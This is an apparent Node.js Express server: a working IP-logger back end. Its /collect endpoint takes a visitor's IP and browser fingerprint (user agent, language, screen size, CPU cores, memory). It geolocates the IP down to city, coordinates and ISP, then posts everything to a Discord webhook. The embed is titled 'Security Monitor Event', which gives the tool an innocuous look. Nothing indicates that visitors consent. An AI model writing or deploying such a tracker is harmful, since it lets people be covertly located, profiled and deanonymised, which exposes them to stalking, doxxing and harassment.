const express = require("express");

const app = express();

app.use(express.json());


const DISCORD_WEBHOOK =
"YOUR_WEBHOOK";


app.post("/collect", async(req,res)=>{


    const visitorIP =
        req.headers["x-forwarded-for"]
        ||
        req.socket.remoteAddress;



    const ipData =
        await fetch(
        `http://ip-api.com/json/${visitorIP}?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,proxy,hosting`
        )
        .then(r=>r.json());



    const browser =
        req.body;



    const embed={

        title:
        "🛡️ Security Monitor Event",

        color:
        3066993,


        fields:[


        {
            name:"🌐 Network",
            value:
            `
IP:
\`${ipData.query}\`

ISP:
${ipData.isp}

ORG:
${ipData.org}

ASN:
${ipData.as}
`
        },


        {
            name:"📍 Location",
            value:
            `
${ipData.city},
${ipData.regionName},
${ipData.country}

Coordinates:
${ipData.lat}, ${ipData.lon}

Timezone:
${ipData.timezone}
`
        },


        {
            name:"🕵️ Risk",
            value:
            `
VPN/Proxy:
${ipData.proxy}

Hosting:
${ipData.hosting}
`
        },


        {
            name:"🖥️ Device",
            value:
            `
${browser.userAgent}

Language:
${browser.language}

Timezone:
${browser.timezone}
`
        },


        {
            name:"📺 Display",
            value:
            `
${browser.screen.width}x${browser.screen.height}

CPU:
${browser.hardware.cores}

RAM:
${browser.hardware.memory || "unknown"}
`
        }


        ],


        timestamp:
        new Date().toISOString()

    };



    await fetch(
        DISCORD_WEBHOOK,
        {

        method:"POST",

        headers:{
            "Content-Type":
            "application/json"
        },


        body:
        JSON.stringify({
            embeds:[embed]
        })

    });



    res.json({
        success:true
    });


});


app.listen(3000,()=>{
console.log("running");
});
